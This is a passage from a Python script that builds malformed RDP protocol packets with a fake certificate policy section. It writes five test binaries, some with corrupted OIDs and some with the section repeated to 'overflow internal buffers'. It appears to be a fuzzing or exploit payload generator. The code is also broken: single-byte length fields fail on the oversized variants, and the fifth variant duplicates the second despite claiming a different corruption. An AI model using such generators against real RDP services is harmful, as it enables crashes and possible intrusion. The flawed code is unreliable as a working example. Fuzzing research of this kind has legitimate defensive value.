        policy_oid[3] ^= 0xFF
        policy_oid = bytes(policy_oid)

    policy_section = b'\x30' + bytes([len(policy_oid)]) + policy_oid

    # Repeat to overflow internal buffers
    if oversize:
        policy_section *= 200

    cert_body = b'\x30' + bytes([len(policy_section)]) + policy_section
    length = len(cert_body)
    return cert_body[:min(length, 2048)]

def generate_blob(filename, corrupt=False, oversize=False):
    cert = make_fake_cert_with_policy(corrupt=corrupt, oversize=oversize)
    mcs = build_mcs_create_response(cert)
    x224 = build_x224_connection_request(mcs)
    tpkt = build_tpkt(x224)
    with open(filename, "wb") as f:
        f.write(tpkt)
    print(f"[+] Created {filename} ({len(tpkt)} bytes)")

# Generate 5 binaries
generate_blob("x1.bin", corrupt=False, oversize=False)  # Valid policy
generate_blob("x2.bin", corrupt=True, oversize=False)   # Corrupt single OID
generate_blob("x3.bin", corrupt=False, oversize=True)   # Oversized (heap stress)
generate_blob("x4.bin", corrupt=True, oversize=True)    # Oversized + corrupt
generate_blob("x5.bin", corrupt=True, oversize=False)   # Different corruption
```

